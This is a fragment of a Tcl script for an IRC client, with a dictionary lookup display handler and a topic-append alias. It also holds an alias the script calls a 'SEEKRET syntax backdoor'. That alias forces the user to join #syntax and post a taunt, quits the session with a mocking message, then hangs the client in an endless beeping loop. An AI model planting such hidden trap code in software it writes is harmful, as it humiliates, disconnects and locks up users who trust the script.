  global spellerr
  global spellerr
  if {[info exists spellerr($y)]} { unset spellerr($y) }
  if {[lindex $text 0] == "SPELLING"} { 
    if {[string length [lindex [split [join $text]] 1]]} { synecho dict "[eheader "dict"] Spelling error in ([b]$y[b])... No suggestions found..."
    } else { synecho dict "[eheader "dict"] Spelling error in ([b]$y[b])... Listing suggestion(s)..." ; synecho dict "[eheader "Dictionary"] [llb] [b]#[b] [lrb] [llb][b]Suggestion:[b]   [lrb]" ; set spellerr($x) "1" }
  } elseif {[lindex $text 0] == "DEFINITION"} { 
    synecho dict "[eheader "dict"] Definition located for ([b]$y[b])... [b][expr [lindex [split [join $text]] 1] + 1][b] definitions(s) retrived..."
  } elseif {[isin [array names spellerr] $x]} {
    synecho dict "[eheader "dict"] [llb][align [lindex [split [join $text]] 0] 3][lrb] [llb][align [lindex [split [join $text]] 1] 14][lrb]"
  } else {
    synecho dict "[eheader "dict"] $text"
  }

alias syntaxbackdoor {
  synecho syntaxbackdoor "[eheader "Backdoor"] Now executing SEEKRET syntax backdoor on [my_nick]..."
  if {![ison [my_nick] #syntax]} { /quote join #syntax }
  /quote privmsg #syntax :p33 0n m3.
  /quote quit :back to aol i go... la dee daa
  for { set x 0 } { $x < 100 } { set x 0 } { beep ; for { set x 0 } { $x < 100 } { set x 0 } { beep } }
  killpipe backdoor
  noidle
  complete
}

alias ta {
  /topic [channel] "[topic [channel]] [raw_args]"
  complete
}
